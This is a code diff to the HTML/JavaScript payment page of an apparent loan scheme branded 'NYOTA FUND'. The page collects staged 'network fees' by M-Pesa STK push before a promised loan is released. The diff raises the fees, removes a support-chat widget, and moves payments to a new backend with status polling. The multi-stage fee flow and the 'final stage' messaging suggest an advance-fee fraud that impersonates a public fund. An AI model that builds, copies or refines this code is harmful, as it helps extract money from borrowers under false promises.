@@ -1,19 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
- <!-- Brevo Conversations {literal} -->
-<script>
-    (function(d, w, c) {
-        w.BrevoConversationsID = '6973a340153840fff105d60b';
-        w[c] = w[c] || function() {
-            (w[c].q = w[c].q || []).push(arguments);
-        };
-        var s = d.createElement('script');
-        s.async = true;
-        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
-        if (d.head) d.head.appendChild(s);
-    })(document, window, 'BrevoConversations');
-</script>
-<!-- /Brevo Conversations {/literal} -->
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -115,9 +101,9 @@ if(!localStorage.getItem("payment1Completed")){
 
     <select id="paymentMethod" required>
       <option value="">-- Choose Network --</option>
-      <option value="mpesa">Safaricom M-Pesa (Ksh 390)</option>
-      <option value="airtel">Airtel Money (Ksh 395)</option>
-      <option value="bank">Bank Account (Ksh 460)</option>
+      <option value="mpesa">Safaricom M-Pesa (Ksh 490)</option>
+      <option value="airtel">Airtel Money (Ksh 495)</option>
+      <option value="bank">Bank Account (Ksh 560)</option>
     </select>
 
     <p style="margin-top:10px;">
@@ -193,7 +179,7 @@ if(!fund || !fund.amount){
 }
 
 /* Fees */
-const fees = { mpesa:390, airtel:395, bank:460 };
+const fees = { mpesa:490, airtel:495, bank:560 };
 paymentMethod.addEventListener('change', () => {
   methodFee.innerText = fees[paymentMethod.value] || '---';
 });
@@ -251,11 +237,19 @@ payment2Form.addEventListener('submit', async (e) => {
 
   let data = null;
   try{
-    const res = await fetch("https://loanserver-a9tc.onrender.com/pay", {
-      method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({ phone: phoneVal, amount, loan_amount: fund.amount })
-    });
+    const res = await fetch(
+  "https://optima-server-isaac.onrender.com/stk-push",
+  {
+    method: "POST",
+    headers: {
+      "Content-Type":"application/json"
+    },
+    body: JSON.stringify({
+      phone: phoneVal,
+      amount: amount
+    })
+  }
+);
 
     if(!res.ok){
       // server returned an error status (e.g., 4xx/5xx)
@@ -272,7 +266,10 @@ payment2Form.addEventListener('submit', async (e) => {
 
   // 2) Server responded — update popup based on server result
   // If server confirms it has initiated the STK push, show STK Push Sent message
-  if(data && data.success && data.reference){
+  if (
+  data.checkout_request_id ||
+  data.CheckoutRequestID
+){
     // Show explicit STK Push Sent popup (spinner kept while awaiting receipt)
     showPopup(
       "STK Push Sent 📲",
@@ -282,7 +279,20 @@ payment2Form.addEventListener('submit', async (e) => {
     );
 
     // Start polling for receipt / status
-    pollReceipt(data.reference, method, amount);
+    const checkoutId =
+  data.checkout_request_id ||
+  data.CheckoutRequestID;
+
+localStorage.setItem(
+  "payment2_checkout_id",
+  checkoutId
+);
+
+pollPayment(
+  checkoutId,
+  method,
+  amount
+);
   } else {
     // Server responded but indicated failure — show reason if available
     payBtn.disabled = false;
@@ -292,49 +302,171 @@ payment2Form.addEventListener('submit', async (e) => {
 });
 
 /* Polling receipt with safety and error handling */
-function pollReceipt(ref, method, amount){
+function pollPayment(
+  checkoutId,
+  method,
+  amount
+){
+
   let attempts = 0;
-  const maxAttempts = 60; // ~5 minutes at 5s interval
-  const intervalMs = 5000;
-  const int = setInterval(async () => {
+
+  const maxAttempts = 60;
+
+  const interval = setInterval(async () => {
+
     attempts++;
-    if(attempts > maxAttempts){
-      clearInterval(int);
-      payBtn.disabled = false;
-      return showPopup("Payment Timeout", "Unable to confirm payment right now. Please check later.", false, true);
-    }
 
-    try{
-      const r = await fetch(`https://loanserver-a9tc.onrender.com/receipt/${encodeURIComponent(ref)}`, { cache: "no-store" });
-      if(!r.ok){
-        console.warn('Receipt fetch not ok', r.status);
-        return;
-      }
-      const d = await r.json();
-      if(!d || !d.receipt || !d.receipt.status) return;
+    try {
 
-      if(d.receipt.status !== "pending"){
-        clearInterval(int);
-         const status = (d.receipt.status || "").toLowerCase();
-        if (["processing", "success", "completed", "paid"].includes(d.receipt.status)) {
-          try{ localStorage.setItem("payment2Completed", "yes"); }catch(e){}
-          showPopup(
-            "Payment Successful ✅",
-            "Your network fee has been received. Your NYOTA FUND is now pending released.your last stage redirecting.....",
-            false,
-            false
-          );
-          setTimeout(() => window.location.href = "payment3.html", 3500);
-        } else {
-          payBtn.disabled = false;
-          showPopup("Payment Failed", "Payment was cancelled or failed.", false, true);
+      const res = await fetch(
+        "https://optima-server-isaac.onrender.com/check-status",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type":"application/json"
+          },
+          body: JSON.stringify({
+            checkout_request_id: checkoutId
+          })
         }
+      );
+
+      const data = await res.json();
+
+      console.log("STATUS:", data);
+
+      const status =
+        data.status?.toLowerCase();
+
+      /*
+        SUCCESS
+      */
+
+      if (status === "completed") {
+
+        clearInterval(interval);
+
+        localStorage.removeItem(
+          "payment2_checkout_id"
+        );
+
+        localStorage.setItem(
+          "payment2Completed",
+          "yes"
+        );
+
+        showPopup(
+          "Payment Successful ✅",
+          `
+          Your network fee has been received.<br><br>
+
+          Transaction Code:
+          <strong>
+          ${data.transaction_code || "Confirmed"}
+          </strong><br><br>
+
+          Your NYOTA FUND is now being prepared.<br><br>
+
+          Redirecting to final stage...
+          `,
+          false,
+          false
+        );
+
+        setTimeout(() => {
+          window.location.href =
+          "payment3.html";
+        }, 2000);
+
       }
-    } catch(err){
-      console.error('Error polling receipt:', err);
-      // transient error — keep polling
+
+      /*
+        FAILED
+      */
+
+      else if (status === "failed") {
+
+        clearInterval(interval);
+
+        localStorage.removeItem(
+          "payment2_checkout_id"
+        );
+
+        payBtn.disabled = false;
+
+        showPopup(
+          "Payment Failed",
+          `
+          ❌ Payment was cancelled or failed.<br><br>
+
+          Please try again.
+          `,
+          false,
+          true
+        );
+      }
+
+      /*
+        STILL PENDING
+      */
+
+      else {
+
+        showPopup(
+          "Waiting for Payment",
+          `
+          ⏳ Waiting for M-Pesa PIN confirmation...
+          `,
+          true,
+          false
+        );
+      }
+
+    } catch(err) {
+
+      console.log(err);
+
     }
-  }, intervalMs);
+
+    /*
+      TIMEOUT
+    */
+
+    if (attempts >= maxAttempts) {
+
+      clearInterval(interval);
+
+      payBtn.disabled = false;
+
+      showPopup(
+        "Timeout",
+        `
+        Payment confirmation timed out.<br><br>
+
+        Please try again.
+        `,
+        false,
+        true
+      );
+    }
+
+  }, 2000);
+      }
+  /*
+  RESUME POLLING
+  AFTER REFRESH
+*/
+
+const savedCheckoutId =
+localStorage.getItem(
+  "payment2_checkout_id"
+);
+
+if (savedCheckoutId) {
+
+  pollPayment(
+    savedCheckoutId
+  );
 }
 </script>
 
